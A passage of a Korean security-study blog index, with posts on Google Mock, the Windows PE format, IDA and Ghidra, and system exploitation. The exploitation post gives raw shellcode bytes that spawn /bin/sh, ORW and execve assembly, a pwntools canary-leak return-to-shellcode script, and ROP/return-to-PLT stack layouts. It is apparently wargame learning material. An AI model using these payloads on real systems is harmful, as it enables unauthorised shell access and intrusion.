EXPECT_CALL(mock, func1); EXPECT_CALL(mock, func2); EXPECT_CALL(mock, func3); // func1 -\u0026gt; func2 -\u0026gt; func3 순서대로 호출이 되어야 함 mock.func1(); mock.func3(); // 함수 호출 순서가 달라서 실패 mock.func2(); } 특정 함수들 간의 순서만 확인하고 싶을 때 EXPECT_CALL().InSequence() 구문을 사용한다. Test(TS, TC) { InSequence seq1, seq2; // 두 개의 순서 선언 MyMock mock; // InSequence 구문으로 명시적으로 seq 객체들을 사용하면, 사용한 함수에만 sequence 적용됨 EXPECT_CALL(mock, func1).InSequence(seq1, seq2); EXPECT_CALL(mock, func2).InSequence(seq1); EXPECT_CALL(mock, func3).InSequence(seq2); EXPECT_CALL(mock, func4) // 순서에 상관없이 아무때나 호출되어도 되는 함수 // func1 -\u0026gt; func2 순서 보장 필요 // func1 -\u0026gt; func3 순서 보장 필요 mock.func4(); // 순서 제약 없는 함수 mock.func1(); // 순서 이상 없음 mock.func3(); // 순서 이상 없음 mock.func2(); // 순서 이상 없음 mock.func4(); // 순서 제약 없는 함수 } HamCrest Matcher Google Mock 의 Matcher 는 HamCrest 라이브러리에 기반하며, 상태기반 검증에서 Matcher 를 활용할 수 있다. ASSERT_THAT, EXPECT_THAT 매크로 함수는 인자로 matcher 구문을 적용하여 검증할 수 있다. EXPECT_THAT(myClass.getName(), testing::StartsWith(\u0026#34;K\u0026#34;)) \u0026lt;\u0026lt; \u0026#34;name doesn\u0026#39;t start with K\u0026#34;; // 함수 결과가 \u0026#34;K\u0026#34; 로 시작하는 string Matcher Document ","permalink":"https://aswinblue.github.io/Blog/post/c++/unit_test/","summary":"Unit Test 테스트의 속성 좋은 단위 테스트를 작성하기 위해서는 아래 세 가지 기준을 만족해야 한다. 가독성\n3A(Arrange / Act / Assert) 순서대로 test case 코드가 작성되어 있어야 한다. test case 가 어떤 동작을 검증하는지 알 수 있어야 한다. test case 의 이름을 명확하게 작성 필요 최신 test framework (java 에서 사용하는 spock)에서는 자연어로 test case 이름을 작성할 수 있도록 지원하는 경우도 있다. (google test 는 미지원) test case 실행 시 printf 문을 한 번 출력 하도록 규칙을 정하여 사용할 수 있다.","title":"Unit Test"},{"content":"Window Programming PE 윈도우는 실행 가능한 목적 파일을 PE 포멧이라 칭한다. (리눅스의 ELF 와 유사) PE 파일은 header 와 section 으로 구성된다. section 에는 이름, 크기, 로드될 주소의 오프셋, 속성과 권한 등의 정보가 들어있다. PE 파일에 들어가야 할 필수 section 은 없지만, \u0026lsquo;.text\u0026rsquo;, \u0026lsquo;.data\u0026rsquo;, \u0026lsquo;.rdata\u0026rsquo; section 이 주로 사용된다. .text: 실행 가능한 기계코드가 위치하는 영역 (읽기, 쓰기 가능) .data: 컴파일 시점에 정해진 전역 변수들이 위치하는 영역 (읽기, 쓰기 가능) .rdata: 컴파일 시점에 값이 정해진 전역 상수와 참조할 DLL 및 외부 함수들의 정보가 위치하는 영역 (읽기만 가능) 윈도우가 실행되면 PE 파일의 데이터들이 메모리에 적재된다. ","permalink":"https://aswinblue.github.io/Blog/post/windowapp/window_programming/","summary":"Window Programming PE 윈도우는 실행 가능한 목적 파일을 PE 포멧이라 칭한다. (리눅스의 ELF 와 유사) PE 파일은 header 와 section 으로 구성된다. section 에는 이름, 크기, 로드될 주소의 오프셋, 속성과 권한 등의 정보가 들어있다. PE 파일에 들어가야 할 필수 section 은 없지만, \u0026lsquo;.text\u0026rsquo;, \u0026lsquo;.data\u0026rsquo;, \u0026lsquo;.rdata\u0026rsquo; section 이 주로 사용된다. .text: 실행 가능한 기계코드가 위치하는 영역 (읽기, 쓰기 가능) .data: 컴파일 시점에 정해진 전역 변수들이 위치하는 영역 (읽기, 쓰기 가능) .rdata: 컴파일 시점에 값이 정해진 전역 상수와 참조할 DLL 및 외부 함수들의 정보가 위치하는 영역 (읽기만 가능) 윈도우가 실행되면 PE 파일의 데이터들이 메모리에 적재된다.","title":"Window_programming"},{"content":"Reverse Engineering software 를 분석하여 소스코드를 역으로 생성 해 내는 기법 software 분석 방법 Static analysis 프로그램을 실행시키지 않고 수행하는 분석이다.\n프로그램의 전체 구조를 파악하기 쉬우며, 환경적 제약 사항에 자유롭고, 악성 코드의 위협으로부터 안전하다.\n난독화 적용시 분석이 어려워 진다는 단점이 있다.\n정적분석에 사용되는 툴로는 IDA 가 있다.\nIDA 는 프리웨어로 https://hex-rays.com/ida-free/ 에서 다운 가능하다. Dynamic analysis 프로그램을 실행시키며 수행하는 분석이다. 프로그램의 개략적인 동작을 빠르게 확인 할 수 있다. 정적 분석과 반대로 프로그램 실행에 필요한 환경 구성이 어려울 수 있다. 안티 디버깅 기법 적용된 프로그램은 디버깅이 불가능하다. IDA 리버스 엔지니어링 툴 단축어 shift + F12 문자열 검색, String 탭으로 이동 x 상호참조 확인, 변수 또는 함수가 사용되는 곳의 위치를 확인 F5 어셈블리를 C 언어 형태로 변환 g 특정 주소 혹은 라인으로 이동 디컴파일 된 함수 이름 위에 커서를 놓고 g 를 누르면 어셈블리 상 함수 라인을 확인할 수 있다. 함수 이름을 적어도 함수 위치로 이동된다. ESC 이전 커서 위치로 이동 Ctrl + Enter 다음 커서 위치로 이동 n 변수 이름 바꾸기 Y 변수 타입 설정 함수 매개변수 변경, 함수 매개변수 타입 변경 F2 어셈블리 혹은 C 언어 라인에서는 break point(중단점) 설정 stack 또는 hex View 에서는 값 변경 F9 실행 (run) 프로그램을 실행시켜 동적 분석을 수행할 수 있다. F8 한 단계 실행 (next) F7 함수 내부로 진입 (step int) Ctrl + F2 디버깅 중단 r hex 데이터를 문자로 변환 Shift + E 선택한 값을 원하는 형태로 변환하여 추출(export) hex 데이터를 문자열로 추출할 때 유용하다. 화면 IDA View\n어셈블리 코드, 디컴파일 결과, Hex-View, 구조체 목록 등 필요에 따른 화면 표시 Stack of main\nmain 함수의 stack String\n코드 내 검색되는 모든 문자열 표시 화면 문자열 더블클릭 시 assembly code view로 이동 Functions\n코드 내 인식되는 함수들 표기 Ctrl + F 로 검색 가능 Graph overview\nIDA View 가 그래프로 표시된 경우, 전체 그래프 중 IDA View 에 표시된 화면 표기 함수 분석 _stdio_common_vfprintf() : printf 함수 출력시 호출되는 함수이다. _stdio_common_vfscanf() : scanf 함수 출력시 호출되는 함수이다. __ROL1__(TARGET, NUM) : TARGET (숫자)을 좌측으로 NUM 번 shift 시키고, 8bit 비트 위로 밀려난 좌측 인자들을 오른쪽 빈자리에 다시 집어넣는 함수 reversing code def rol1(v, s):\rv = (v \u0026lt;\u0026lt; s) | (v \u0026gt;\u0026gt; (8 - s)) # bit shift \u0026amp; push back\rreturn v \u0026amp; 0xff # 8bit 영역만 사용 __popcnt(NUM) : NUM 을 2진수로 변경했을 때 1의 갯수를 반환 reversing code def popcnt(v):\rreturn bin(v).count(\u0026#39;1\u0026#39;) __ROR1__(TARGET, NUM) : TARGET (숫자)을 우측으로 NUM 번 shift 시키고, 8bit 비트 위로 밀려난 우측 인자들을 왼쪽 빈자리에 다시 집어넣는 함수 reversing code def ror(value, count) :\rtmp1 = value \u0026gt;\u0026gt; count\rtmp2 = value \u0026lt;\u0026lt; (8 - count)\rreturn((tmp1 + tmp2) % 2**8) MEMORY[] : 메모리 주소에 담긴 값을 나타냄 MEMORY[0xDEADBEEF000] 은 0xDEADBEEF000 번지 주소의 값을 반환함 WinAPI 관련 함수 API 관련 문서는 MSDN 링크 에서 찾아볼 수 있다. __stdcall WinMain : GUI 실행시 가장 먼저 호출되는 함수 RegisterClassExW(v11) : 윈도우 클래스 등록하는 함수 인자로 들어가는 \u0026ldquo;v11\u0026rdquo; 변수는 윈도우 클래스이다. lpfnWndProc : 윈도우의 메시지 콜백 함수로, 개발자가 의도한 윈도우의 business logic은 주로 이 함수 안에서 정의되어 있다. 함수 수정 assembly 코드 화면에서 메뉴 -\u0026gt; edit -\u0026gt; patch program -\u0026gt; assemble 메뉴를 클릭하면 해당 라인의 어셈블리를 변경할 수 있다. 변경 이후에는 다시 메뉴 -\u0026gt; edit -\u0026gt; -\u0026gt; patch program -\u0026gt; apply patch to input file 을 선택하면 패치가 적용된다. Ghidra NASA에서 사용하는 리버스 엔지니어링 툴로, 오픈소스로 공개되어 있다. jdk를 사용하고 github 에서 다운로드 가능하다. 다양한 도구들을 내장하고 있으며, GUI도 지원이 가능하다. 구성요소 Code Browser\nGhidra 에 내장된 도구로, 다음 기능이 가능하다. 디스어셈블: 분석 대상 프로그램의 기계어를 역으로 어셈블하여 어셈블리 언어 형태의 코드로 보여줍니다. 디컴파일: 디스어셈블 결과를 C언어 형태로 디컴파일하여 사람이 이해하기 쉬운 코드로 변환하여 보여줍니다. 코드 자동 분석: 프로그램 내에 존재하는 함수들을 자동으로 식별하고, 변수의 타입을 추론합니다. 코드 시각화: 제어 흐름 그래프(Control Flow Graph)로 코드의 흐름을 시각적으로 표현하여 코드의 복잡한 구조를 비교적 쉽게 파악할 수 있습니다. 스크립팅: 사용자가 자신의 요구에 맞게 분석 프로세스를 스크립트로 작성하고 실행할 수 있습니다. 심볼 정보 수정 주석 기능 프로그램 흐름 시각화(Graph View) 단축키 참조 디컴파일 창(Decompile) C언어 형태로 디컴파일된 코드를 볼 수 있습니다. 디스어셈블 리스팅(2번 윈도우)에서 어셈블리 명령어를 클릭하면 해당 부분을 디컴파일하여 디컴파일 윈도우에서 보여줍니다. 함수를 자동으로 추정하여 아래 정보를 추출 해 냄 (추정한 정보이기 때문에 부정확할 수 있음, pointer 타입이 long 타입으로 지정될 수 있다) 함수 호출 규약 반환 타입 함수 이름 파라미터 타입과 이름 함수 이름에 마우스 우클릭 -\u0026gt; Edit Function Signature 을 선택하여 함수 정보를 수정할 수 있음 변수에 우클릭 -\u0026gt; Rename Variable 선택하여 변수 이름 수정 가능 변수에 오클릭 -\u0026gt; Retype Variable 선택하여 변수 타입 수정 가능 공간에 우클릭 -\u0026gt; Comments -\u0026gt; Set Pre Comment 로 주석 작성 가능 공간에 우클릭 -\u0026gt; Bookmark로 북마크 설정 가능 메뉴 -\u0026gt; Windows -\u0026gt; Bookmark 로 새로운 창 띄워서 설정한 bookmark list 확인 가능 디스어셈블 리스팅(Listing) 디스어셈블된 코드를 볼 수 있습니다. 디컴파일 창(1번 윈도우)에서 원하는 부분을 클릭하면 해당 부분을 디스어셈블 리스팅에서 보여줍니다. 심볼 트리(Symbol Tree) 프로그램에 존재하는 심볼들(함수 이름)을 볼 수 있습니다. 원하는 심볼을 더블클릭하면 디스어셈블 리스팅이 해당 위치로 이동합니다. 프로그램 트리(Program Trees) 프로그램을 계층 구조로 쪼개어 보여줍니다. 예를 들어서 리눅스 실행 파일 포맷인 ELF 프로그램의 경우, 내부적으로 .text, .data, .rodata와 같은 섹션으로 나누어져 있습니다. 프로그램 트리에서 특정 섹션을 클릭하면, 디스어셈블 리스팅이 해당하는 섹션의 위치로 이동합니다. 데이터 타입 매니저(Data Type Manager) 데이터 타입을 관리할 수 있는 창입니다. 라이브러리에 정의된 타입을 불러오거나 분석을 통해 알아낸 구조체를 관리할 수 있습니다. 복잡한 프로그램을 분석하는 과정에서 구조체를 수동으로 식별하여 관리하는 작업에 사용 구조체 추가 프로그램 이름이 적힌 폴더에 우클릭 -\u0026gt; New -\u0026gt; Structure 선택 콘솔(Console) Ghidra 스크립트의 실행 결과가 출력. 스크립팅 기능으로 자동화 가능 Byte viewer 메뉴 -\u0026gt; Window -\u0026gt; bytes:~~~ 선택하여 바이너리를 byte 로 읽은 내용 확인 함수 호출관계 그래프 메뉴 -\u0026gt; Window -\u0026gt; Function Call Graph 선택하여 함수간 링킹 관계 표시 (정적 링킹은 동적링킹에 비해 복잡하게 표시될 수 있음) 함수 그래프 메뉴 -\u0026gt; Window -\u0026gt; Function Graph 로 어셈블리 코드상 함수 호출 구조를 확인 사용법 문자열 검색 : 메뉴 -\u0026gt; search -\u0026gt; For String 주소 역참조 : disassem 화면에서 주소에 마우스 우클릭 -\u0026gt; references -\u0026gt; show reference to address Ghidra 오픈소스 리버싱 툴 Script 스크립트를 활용하여 반복적인 작업을 자동화 할 수 있다. Script Manager 를 활용하여 ","permalink":"https://aswinblue.github.io/Blog/post/systemhacking/reverse_engineering/","summary":"Reverse Engineering software 를 분석하여 소스코드를 역으로 생성 해 내는 기법 software 분석 방법 Static analysis 프로그램을 실행시키지 않고 수행하는 분석이다.\n프로그램의 전체 구조를 파악하기 쉬우며, 환경적 제약 사항에 자유롭고, 악성 코드의 위협으로부터 안전하다.\n난독화 적용시 분석이 어려워 진다는 단점이 있다.\n정적분석에 사용되는 툴로는 IDA 가 있다.\nIDA 는 프리웨어로 https://hex-rays.com/ida-free/ 에서 다운 가능하다. Dynamic analysis 프로그램을 실행시키며 수행하는 분석이다. 프로그램의 개략적인 동작을 빠르게 확인 할 수 있다. 정적 분석과 반대로 프로그램 실행에 필요한 환경 구성이 어려울 수 있다.","title":"Reverse Engineering"},{"content":"Exploit pwntool의 checksec 명령어로 어떤 보안이 적용되었는지 확인 가능하다. Shell Code exploit은 파일 읽고 쓰기(open-read-write, orw), 셸 명령 실행(execve) 권한을 취득하는 것을 목표로 한다. Shell 권한을 획득하기 위한 어셈블리 코드들의 모음을 \u0026lsquo;Shell Code\u0026rsquo; 라 칭한다. 환경세팅 pwntools checksec shellcraft ROPgadget one_gadget patchelf 취약점 공격 순서 바이너리를 분석하여 보호기법을 확인한다. checksec 명령어를 사용하여 바이너리에 적용된 보호기법을 확인하고, 적용 불가능한 exploit 기법을 추려낸다. checksec 참조 ldd 명령을 활용하여 의존성 관계를 확인한다. ldd 명령 코드를 확인하여 취약점 및 구조(stack 형태)을 파악한다 stack은 함수에서 선언된 순서대로 할당되지 않음에 주의하며, 무조건 assembly어를 통해 stack 주소에서 특정 변수의 위치를 확인하도록 한다.\nreadelf -h ELF 파일의 헤더 확인\nreadelf -s ELF 파일 내부 symbol 정보들을 출력\n함수 주소, 이름 및 속성들을 확인할 수 있다. readelf -S ELF 파일 내부 Section 정보들을 출력\nobjdump -h 명령과 동일한 결과를 출력 section의 크기, VMA(Virtual Memory Address), LMA(Load Memory Address), file offset 등의 정보를 확인할 수 있다. objdump -S FILE_NAME: object file을 어셈블리 형태로 주소별로 출력\nobjdump -h FILE_NAME: object file의 section 헤더정보를 확인\nobjdump -d FILE_NAME: object file 내용을 어셈블리어 형태로 출력한다.\nobjdump --disassemble=main : main 함수 disassemble 확인\ngdb 실행 이후 disass main 으로도 확인 가능 함수의 인자와 레지스터\n함수의 인자는 순서대로 rdi, rsi, rdx, rcx, r8, r9, [rsp], [rsp+8], [rsp+0x10], [rsp+0x18], [rsp+0x20] \u0026hellip; 값을 가져와서 사용한다. 프로그램을 실행시키며 취약점 공략 및 쉘 권한 탈취 pwndbg 및 pwntool 활용 자주 쓰는 구문 [pwntool] libc_base 주소 획득\nlibc = ELF(\u0026#39;./libc.so.6\u0026#39;)\rlibc.symbols[\u0026#39;_IO_2_1_stdout_\u0026#39;] # 라이브러리에서 \u0026#39;stdout\u0026#39; 의 상대위치 획득\rlibc.symbols[\u0026#39;_IO_file_jumps\u0026#39;] # 라이브러리에서 \u0026#39;_IO_jump_t\u0026#39; 구조체 정의 위치 획득 [linux] 라이브러리 참조 경로 설정 export LD_PRELOAD=$(realpath ./libc.so.6)\n[SYSV 규약의 특징]\n함수 호출시 사용되는 인자는 레지스터에 rdi, rsi, rdx, rcx, r8, r9 순서대로 적용된다. 6개를 넘어서는 인자는 stack 에 쌓인다. [assembly 구문]\n64비트 환경에서 쉘 실행 구문(31byte) : \\x48\\x31\\xff\\x48\\x31\\xf6\\x48\\x31\\xd2\\x48\\x31\\xc0\\x50\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x53\\x48\\x89\\xe7\\xb0\\x3b\\x0f\\x05 64비트 환경에서 쉘 실행 구문(23byte) : \\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05 취약점 및 공략 샘플 코드 ORW 파일을 열고 읽고 쓸 수 있도록 하는 shell code를 \u0026lsquo;ORW shell code\u0026rsquo; 라 칭한다. 시스템 콜들은 rax, rdi, rsi, rdx로 이루어 져 있음을 참고하여 shell code를 작성해 보자. rax : 시스템 콜에 대응되는 번호 rdi : 시스템 콜의 첫번째 인자 rsi : 시스템 콜의 두번째 인자 rdx : 시스템 콜의 세번째 인자 open\n리눅스에서 open 명령은 open('FILE_PATH', flag, mode) 형태이다. 이를 어셈블리어로 분리하여 표현하면 \u0026lsquo;FILE_PATH\u0026rsquo; 을 stack에 담는다. 이때, stack에는 데이터가 8byte씩 올라가기 때문에 8byte 단위로 string을 끊어서 push한다. ex) \u0026ldquo;1234567890\u0026rdquo; 을 stack에 담을 때 \u0026ldquo;09\u0026rdquo; \u0026ldquo;87654321\u0026rdquo; 순으로 데이터를 push해야 한다. rsp를 rdi로 옮겨 rdi(첫번째 인자)가 \u0026lsquo;FILE_PATH\u0026rsquo;를 가리키도록 한다. 두 번째와 세 번째 인자에 맞게 각각 rsi와 rdx를 설정한다. open은 시스템 콜 번호 2에 해당하므로 rax를 2로 설정한다. ex) open (\u0026ldquo;1234567890\u0026rdquo;, O_RDONLY, NULL) 은 아래 어셈블리어로 치환된다. push 0x3039\rmov rax, 0x3837363534333231 ; to push 8byte\rpush rax\rmov rdi, rsp ; (1) rdi = \u0026#34;1234567890\u0026#34;\rxor rsi, rsi ; (3) rsi = 0 ; O_RDONLY\rxor rdx, rdx ; (3) rdx = 0 ; NULL\rmov rax, 2 ; (4) rax = 2 ; syscall_open\rsyscall ; open(\u0026#34;1234567890\u0026#34;, O_RDONLY, NULL) read\nread 명령은 read(FILE_DESCRIPTOR, buf, size) 형태이다. read 명령을 어셈블리어로 표현하면 open을 통해 열린 파일의 file descriptor는 rax 영역에 저장되므로, rax 값을 rdi 에 대입한다. 데이터를 저장할 길이를 고려하여 rsi에 값을 대입한다. size가 10이라면 rsp-10 값을 대입한다. rdx 에 size 값을 대입한다. rax 에 read에 해당하는 0 값을 대입한다. ex) read(fd, buf, 10) 은 아래 어셈블리어로 표현된다. mov rdi, rax ; (1) fd값을 rdi에 대입\rmov rsi, rsp\rsub rsi, 0x0A ; (2) rsi = rsp-10 ; buf\rmov rdx, 0x0A ; (3) rdx = 0x0A ; length\rmov rax, 0x0 ; (4) rax = 0 ; syscall_read\rsyscall ; read(fd, buf, 0x0A) write\nwrite 명령은 write(FILE_DESCRIPTOR, buf, size) 형태이다. write 명령을 어셈블리어로 표현하면 rdi 에 FILE_DESCRIPTOR 값을 대입한다. stdout으로 출력을 하려면 0x01을 적용한다. rsi 와 rdx 는 read 에서 사용한 값과 동일한 값을 적용한다. write 에 해당하는 시스템콜 번호 1을 rax 에 대입한다. ex) write(fd, buf, 10) 은 아래 어셈블리어로 표현된다. mov rdi, 1 ; (1) rdi = 1 ; fd = stdout\r; rsi rdx 값은 read와 동일한 값 사용, 별도 설정 안함\rmov rax, 0x1 ; (3) rax = 1 ; syscall_write\rsyscall ; write(fd, buf, 0x0A) shell code는 어셈블리 형태이므로 기계어로 컴파일 해서 사용 가능하지만, 실행될 기기의 os, cpu에 따라 다른 방법을 사용해야 한다. shell code를 동작시키기 위해 skeleton code에 shell code를 삽입하여 컴파일 하는 방법을 사용할 수 있다. skeleton code란, 아무런 동작도 하지 않는 어셈블리어로 작성된 코드로, 컴파일이 가능하다. 마치 C언어에서 void main(void) { return 0 } 를 컴파일 하는 것과 같다. C언어로 작성된 skeleton code의 예시는 아래와 같다. // 어셈블리어로 작성한 \u0026#39;assem_code\u0026#39; 함수를 실행시키는 파일\r__asm__(\r\u0026#34;.global assem_code\\n\u0026#34;\r\u0026#34;assem_code:\\n\u0026#34;\r# 여기에 원하는 assembly code를 집어넣는다.\r# 어셈블리 코드는 라인마다 마지막에 \u0026#39;\\n\u0026#39; 가 붙어야 함에 주의한다.\r\u0026#34;xor rdi, rdi # rdi = 0\\n\u0026#34;\r\u0026#34;mov rax, 0x3c\t# rax = sys_exit\\n\u0026#34;\r\u0026#34;syscall # exit(0)\u0026#34;\r);\rvoid assem_code();\rint main() { assem_code(); } execve execve() 는 Linux kernel 레벨의 함수로, 특정 프로그램을 실행시키는 함수이다. execve(\u0026quot;/bin/bash\u0026quot;, NULL, NULL) 을 실행할 수 있게 되면 쉘을 실행할 수 있는 권한을 얻은 것이다. execve는 execve(FILE_NAME, argv, envp) 형태로 실행되며, FILE_NAME은 실행할 프로그램 경로, argv는 인자, envp는 환경변수에 해당한다. execve를 어셈블리어로 표현하면 스택에 \u0026lsquo;/bin/bash\u0026rsquo; 를 넣고 rdi에 그 주소를 대입한다. rsi와 rdx는 NULL이므로 0을 대입한다. execve는 시스템콜 번호 0x3B에 해당하므로 rax는 0x3B가 적용된다. push 0x68\rmov rax, 0x7361622f6e69622f\rpush rax\rmov rdi, rsp ; (1) rdi = \u0026#34;/bin/bash\u0026#34;\rxor rsi, rsi ; (2) rsi = NULL\rxor rdx, rdx ; (2) rdx = NULL\rmov rax, 0x3b ; (3) rax = execve\rsyscall ; execve(\u0026#34;/bin/bash\u0026#34;, null, null) buffer overflow 프로그램에 입력을 위해 지정된 버퍼를 초과하여 입력값을 집어넣어 버퍼 다음에 할당된 메모리의 값을 덮어쓰는 행위 scanf(\u0026quot;%s\u0026quot;,buf)는 입력값의 갯수 제한이 없기 때문에 buffer overflow에 취약하므로 절대 사용하면 안되는 형태 중 하나이다. scanf와 유사하게 strcpy, strcat, sprintf 도 길이에 제약이 없는 함수로, 대신 strncpy, strncat, snprintf, fgets, memcpy 를 사용하는것이 권장된다. C 계열 언어에서 문자열(string)을 처리할 때 문자열의 종결을 null(\u0026rsquo;\\0\u0026rsquo;) 문자로 판단하는데, 문자열 끝에 null이 존재하지 않는 경우 문자열보다 더 뒷편의 주소를 참조하게 될 수 있고, 이를 OOB(out of boundary) 취약점이라 한다. ROP(Return Oriented Programming) gadget 이란 어셈블리어에서 ret 명령어 앞에 오는 코드 조각으로, 코드의 실행을 제어한다. gadget 을 사용하여 함수의 호출 혹은 인자를 조작하는 공격 방식을 ROP라 한다. payload를 return gadget(리턴 가젯) 으로 채워지기에 ROP chain 이라고도 한다. Return to Shellcode buffer overflow를 통해 버퍼에 shell 함수 실행 코드를 삽입하고 STL 에서 return 주소를 해당 버퍼의 주소로 치환하여 shell code를 실행하는 해킹 기법 문제 풀이 예시 from pwn import *\rdef slog(n, m): return success(\u0026#39;: \u0026#39;.join([n, hex(m)]))\rp = process(\u0026#39;./r2s\u0026#39;)\r#p = remote(\u0026#34;host3.dreamhack.games\u0026#34;, \u0026#34;11171\u0026#34;)\rcontext.arch = \u0026#39;amd64\u0026#39;\r# [1] Get information about buf\rp.recvuntil(b\u0026#39;Address of the buf: \u0026#39;)\rbuf = int(p.recvline()[:-1], 16) # remote \u0026#39;\\n\u0026#39;\rslog(\u0026#39;Address of buf\u0026#39;, buf)\rp.recvuntil(b\u0026#39;buf and $rbp: \u0026#39;)\rbuf2sfp = int(p.recvline().split()[0]) # another way to remove \u0026#39;\\n\u0026#39;\rbuffer_to_canary = buf2sfp - 8 # canary is in rbp+8, so buf + buffer_to_canary - 8 is address of canary\rslog(\u0026#39;buf \u0026lt;=\u0026gt; sfp\u0026#39;, buf2sfp)\rslog(\u0026#39;buf \u0026lt;=\u0026gt; canary\u0026#39;, buffer_to_canary)\r# [2] Leak canary value\rpayload = b\u0026#39;A\u0026#39;*(buffer_to_canary + 1) # (+1) because of the first null-byte\rp.sendafter(b\u0026#39;Input:\u0026#39;, payload)\rp.recvuntil(payload)\rcanary = b\u0026#39;\\x00\u0026#39;+p.recvn(7)\rslog(\u0026#39;Canary\u0026#39;, u64(canary))\r# [3] Exploit\rshell_code = asm(shellcraft.sh())\rprint(\u0026#39;Length of Shell Code:\u0026#39; , len(shell_code))\rpayload = shell_code.ljust(buffer_to_canary, b\u0026#39;A\u0026#39;) + canary + b\u0026#39;B\u0026#39; * 0x8 + p64(buf)\r# 버퍼에 쉘 코드를 넣고, 남는 공백은 아무 문자로 메꾼다. 그 후 카나리를 잘 덮고 SFP는 아무 숫자나 채워넣고 리턴 주소를 버퍼 주소로 덮어씀\r# gets() receives input until \u0026#39;\\n\u0026#39; is received\rp.sendlineafter(b\u0026#39;Input:\u0026#39;, payload) p.interactive() RTL (Return To Library) NX를 통해 특정 버퍼의 실행을 막자 library의 코드를 실행시켜서 쉘 권한을 얻는 방식의 해킹 기법 리눅스의 libc 라이브러리의 system, execve 함수를 실행시키는 것이 대표적이다. Return to PLT ASLR 기법이 적용되어도 PLT의 주소는 고정되어 있음을 이용한 공격 방법 으로, PIE 기법을 적용하면 Return to PLT 공격을 예방할 수 있다. system 함수가 호출되고, canary가 유출되는 코드라면 아래 절차로 쉘을 실행시킬 수 있다. system() 이 호출 될 때 rdi 를 반환하는 위치를 찾는다. rdi 값을 \u0026ldquo;/bin/sh\u0026quot;로 설정하게 된다면 system(\u0026quot;/bin/sh\u0026rdquo;), 즉 쉘을 실행하게 되는 것이다. ROPgadget 을 사용하여 pop rdi 구문의 주소를 찾는다. (여러 개 있다면 이중 system() 함수의 위치를 특정해야 한다.) ROPgadget --binary BINARY_FILE_PATH --re pop rdi 를 입력하면 BINARY_FILE_PATH 경로의 바이너리에서 \u0026lsquo;pop rdi\u0026rsquo; 구문이 들어있는 gadget들을 출력한다. /bin/sh 문자열이 저장된 주소를 확인한다. gdb로 바이너리를 실행시킨 후 search /bin/sh 명령으로 확인 가능하다. system 함수의 PLT 주소를 확인한다. gdb로 바이너리를 실행시킨 후 plt 명령으로 system@plt 값의 주소를 확인한다. (info func system@plt 명령도 가능) 리턴 가젯의 주소를 확인한다. ROPgadget --binary BINARY_FILE_PATH --re ret 명령중 ret 가 단독으로 있는 라인(리턴 가젯)의 주소를 확인한다. system() 함수는 내부에서 movaps 함수를 사용하는데, x64 환경에서 이 함수는 스택에서 값을 읽어올 때 16바이트로 정렬되는지 확인하고, 16바이트로 묶어지지 않는다면 exception을 발생시켜 segment fault을 유발한다. 이를 \u0026lsquo;리턴 가젯\u0026rsquo;을 스택에 집어넣어 8바이트를 추가하여 16바이트를 맞춘다. exploit을 활용해 A 주소번지를 스택프레임에 return code 영역에 넣으려 할 때, 아래와 같이 return code 자리에 직접 A 주소를 집어넣어도 되지만, canary\r---------- rbp\rSFP\r---------- rbp + 0x8\rreturn code \u0026lt;-- A 주소 주입\r---------- rbp + 0x10 아래 그림과 같이 return code 자리에 리턴 가젯을 주입해도 된다. canary\r---------- rbp\rSFP\r---------- rbp + 0x8\rreturn code \u0026lt;-- 리턴 가젯 주입 ---------- rbp + 0x10\r??????? \u0026lt;-- A 주소 주입 리턴가젯 ret 는 pop rip; jmp rip 와 같은 효과이고, 이는 결국 rbp + 0x10 위치에 있는 A 주소를 실행하게 되어 첫번째 코드와 동작성은 같다. 다만, return code 자리보다 8byte 아래쪽 주소를 사용하게 된다. MOVAPS 관련 참조 페이지 buffer overflow를 활용해 canary를 복구하고, SFP를 아무 값으로 채운다. return code 리턴 가젯으로 채워 rbp+0x10의 주소에 있는 코드가 실행되도록 한다. (system 함수의 movaps 에 대응하기 위함) rbp + 0x10 주소를 pop rdi 가젯으로 채우고, (2)에서 찾은 /bin/sh 주소를 집어넣고, (3) 에서 찾은 system 함수의 plt 주소를 그 다음에 집어넣는다. 여기까지 수행하면 스택은 다음과 같다. canary\r---------- rbp\rSFP \u0026lt;-- 랜덤값 주입\r---------- rbp + 0x8\rreturn code \u0026lt;-- 리턴 가젯 주입 ---------- rbp + 0x10\r??????? \u0026lt;-- pop rdi 가젯 주입\r---------- rbp + 0x18\r??????? \u0026lt;-- \u0026#34;/bin/sh\u0026#34; string 주소 주입\r---------- rbp + 0x20\r??????? \u0026lt;-- system() 함수 plt 주소 주입\r``` Return Oriented Programming 앞서 살펴본 Return to ~ 공격은 일부 방어 기법이 빠져있을 때 사용할 수 있었다. 카나리, NX, ASLR이 모두 적용되어 있어도, 프로그램에 buffer overflow 취약점을 통해 exploit 을 수행하는 방법을 알아본다. NX 보호기법 때문에 코드를 직접 버퍼에 작성하고 실행시킬수 없기에 \u0026ldquo;Return To Library\u0026rdquo; 에서처럼 라이브러리의 system 함수와 \u0026quot;/bin/sh\u0026quot; 문자열을 사용하여 system(\u0026quot;/bin/sh\u0026quot;) 를 동작시키는 것을 최종 목표로 한다. stack canary 주소 확인\nprintf, write, puts 등 버퍼를 출력하는 함수의 버퍼를 overflow 시켜 rbp-0x08 에 위치한 canary를 확인한다. stack 참조 system() 함수 주소 확인\nlibc.so.6 에 정의된 system 함수의 위치를 확인하기 위해 같은 라이브러리에 포함된 read, puts, printf 등의 함수가 호출되어 GOT 에 저장되었는지 확인한다. 라이브러리의 함수가 하나라도 호출되었다면, 라이브러리 파일 전체가 로드 되기 때문에 syetem 함수도 메모리에 적재 됨이 보장된다. PLT/GOT 참조 ASLR을 통해 라이브러리 파일의 적재 위치를 랜덤화 시켰지만, 라이브러리 파일 내부의 함수 위치는 랜덤화 시키지 못한다. 즉, libc 라이브러리 버전이 같다면 실행된 프로그램의 메모리 상에 로딩된 puts 함수의 주소와 system 함수의 주소상 거리는 항상 일치한다는 것이다. 이 점을 이용하여 (1) libc 라이브러리의 시작 주소(libc_base) 와 (2) system 함수의 offset 을 알 수 있다면 system 함수의 호출이 가능하다. libc 라이브러리의 시작 주소(libc_base) 확인\ngot에 로드 된 libc 함수의 주소와 해당 함수의 offset 을 빼면 libc_base 주소를 획득할 수 있다. libc_base 는 마지막 바이트가 항상 00 으로 끝나는 특징이 있다. linux 명령어 + gdb 사용\n리눅스 